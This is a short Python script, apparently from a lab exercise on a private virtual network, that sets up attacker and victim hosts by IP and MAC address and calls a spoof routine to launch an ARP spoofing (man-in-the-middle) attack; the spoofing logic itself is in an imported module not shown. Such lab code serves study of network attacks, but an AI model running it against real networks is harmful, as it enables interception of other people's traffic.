import ARP
from classes import User

def ARPSpoof():
    attacker = User('192.168.56.103',
        '08:00:27:d0:25:4b')
    victim = User('192.168.56.101',
        '08:00:27:b7:c4:af')
    arp = ARP(attacker, victim, '192.168.56.102')
    arp.spoof()


if __name__ == '__main__':
    ARPSpoof()